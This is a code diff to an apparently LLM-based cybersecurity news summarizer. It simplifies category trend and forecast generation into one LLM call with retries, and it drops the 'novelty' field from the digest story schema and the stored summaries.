-    return analysis
-
-
 def generate_category_insight(category_name, subcategory_tag=None, since_days=None):
     """Generate trend analysis and forecast for a threat category.
 
     Retrieves all summarized articles for the given category (and
     optionally a subcategory entity), then asks the LLM to produce a
-    trend analysis and forward-looking forecast.
+    trend analysis and forward-looking forecast in a single pass
+    (mirrors the Android ``GenerateCategoryInsightUseCase``).
 
     Args:
         category_name: Broad category name (e.g. ``"Malware"``).
@@ -497,7 +611,7 @@ def generate_category_insight(category_name, subcategory_tag=None, since_days=No
     else:
         context_label = category_name
 
-    # Build input: newest articles first, title + date + executive summary extract
+    # Build input: title + date + executive summary extract, one line per article.
     lines = []
     for art in articles:
         date_str = art.get("published_date") or "unknown date"
@@ -506,7 +620,42 @@ def generate_category_insight(category_name, subcategory_tag=None, since_days=No
         exec_match = match.group(1).strip() if match else summary[:500]
         lines.append(f"- **{art['title']}** ({date_str}): {exec_match}")
 
-    analysis = _iterative_insight_analysis(lines, context_label, len(articles))
+    input_text = "\n".join(lines)
+    if len(input_text) > _INSIGHT_MAX_CHARS:
+        input_text = input_text[:_INSIGHT_MAX_CHARS] + "\n\n[Truncated...]"
+
+    system_prompt = TREND_FORECAST_PROMPT.format(category=context_label)
+    user_message = f"Category: {context_label}\nArticle count: {len(articles)}\n\n{input_text}"
+
+    analysis = None
+    for attempt in range(3):
+        try:
+            content, it, ot, cc, cr = call_llm(
+                system_prompt,
+                [{"role": "user", "content": user_message}],
+                temperature=0.4,
+                max_tokens=2000,
+                json_mode=True,
+            )
+            cost_tracker.add_tokens(it, ot, cc, cr)
+            parsed = json.loads(content)
+            analysis = {
+                "trend": parsed.get("trend", ""),
+                "forecast": parsed.get("forecast", ""),
+            }
+            break
+        except Exception as e:
+            if _is_rate_limit_error(e):
+                wait = 2 ** (attempt + 1)
+                logger.warning(f"Rate limited, waiting {wait}s before retry")
+                time.sleep(wait)
+            elif attempt < 2:
+                logger.error(f"Insight generation error (attempt {attempt + 1}): {e}")
+                time.sleep(1)
+            else:
+                logger.error(f"All insight retries failed: {e}")
+                return None
+
     if analysis is None:
         return None
 
@@ -581,7 +730,7 @@ Respond ONLY with valid JSON."""
 _EXEC_SUMMARY_RE = re.compile(r"# Executive Summary\s*\n([\s\S]*?)(?=\n#|\n*$)", re.IGNORECASE)
 _TREND_BATCH_SIZE = 50
 _TREND_MAX_SUMMARY_CHARS = 300
-_INSIGHT_CHUNK_CHARS = 10_000
+_INSIGHT_MAX_CHARS = 20_000
 
 
 def _group_by_quarter(articles):
@@ -858,12 +1007,10 @@ DIGEST_STORY_PROMPT = """You are a senior cybersecurity threat intelligence anal
 You have been given multiple news articles from different sources that cover the same security story.
 Synthesize them into a unified story entry for a daily digest email.
 
-Produce a JSON object with exactly five keys:
+Produce a JSON object with exactly four keys:
 - "story_title": A concise, specific headline (max 15 words) that captures the core security event.
 - "executive_summary": A paragraph that weaves together what each source reported, using the pattern
   "Source X reported that ... Source Y noted that ...". Mention each source by name.
-- "novelty": A paragraph describing what is novel or noteworthy about the TTPs, tools, or techniques
-  across all sources. Synthesize novelty from all sources; if nothing is novel say so briefly.
 - "details": A JSON array of strings. Each string is one detailed bullet synthesizing technical
   findings across sources. Use "Source X said ..." attribution where sources differ. Be thorough.
 - "mitigations": A JSON array of strings. Each string is one mitigation or defensive recommendation,
@@ -901,9 +1048,6 @@ def synthesize_digest_story(cluster_articles):
         # Extract details
         d_match = _re.search(r"# Details\s*\n([\s\S]*?)(?=\n#|\Z)", summary, _re.IGNORECASE)
         details_raw = d_match.group(1).strip() if d_match else ""
-        # Extract novelty
-        n_match = _re.search(r"# Novelty[^\n]*\n([\s\S]*?)(?=\n#|\Z)", summary, _re.IGNORECASE)
-        novelty_raw = n_match.group(1).strip() if n_match else ""
         # Extract mitigations
         m_match = _re.search(r"# Mitigations\s*\n([\s\S]*?)(?=\n#|\Z)", summary, _re.IGNORECASE)
         mit_raw = m_match.group(1).strip() if m_match else ""
@@ -911,7 +1055,6 @@ def synthesize_digest_story(cluster_articles):
             f"Source: {art.get('source_name', 'Unknown')}\n"
             f"Title: {art.get('title', '')}\n"
             f"Executive Summary: {exec_sum}\n"
-            f"Novelty: {novelty_raw[:400]}\n"
             f"Details: {details_raw[:600]}\n"
             f"Mitigations: {mit_raw[:400]}"
         )
@@ -933,7 +1076,6 @@ def synthesize_digest_story(cluster_articles):
             return {
                 "story_title": result.get("story_title", cluster_articles[0].get("title", "Security Story")),
                 "executive_summary": result.get("executive_summary", ""),
-                "novelty": result.get("novelty", ""),
                 "details": result.get("details", []),
                 "mitigations": result.get("mitigations", []),
                 "source_urls": source_urls,
@@ -957,7 +1099,6 @@ def synthesize_digest_story(cluster_articles):
             f"{a.get('source_name', 'A source')} reported on this story." for a in cluster_articles
         ),
         "details": [f"{a.get('source_name', 'Source')}: {(a.get('summary_text') or '')[:200]}" for a in cluster_articles],
-        "novelty": "",
         "mitigations": [],
         "source_urls": source_urls,
     }
@@ -996,15 +1137,16 @@ def summarize_pending(limit=10, article_ids=None):
 
         if result:
             attack_flow = result.get("attack_flow", [])
-            novelty = result.get("novelty", "")
+            # novelty_notes / network_traffic_reason are no longer produced (Android-aligned
+            # schema); pass None so legacy DB columns stay intact but unused for new rows.
             save_summary(
                 article_id=article_id,
                 summary_text=result["summary"],
                 key_points=json.dumps(attack_flow) if attack_flow else None,
                 tags=json.dumps(result["tags"]),
-                novelty_notes=novelty if novelty else None,
+                novelty_notes=None,
                 model_used=get_model_name(),
-                network_traffic_reason=result.get("network_traffic_reason"),
+                network_traffic_reason=None,
             )
             summarized += 1
             logger.info(f"  Summarized article {article_id}")
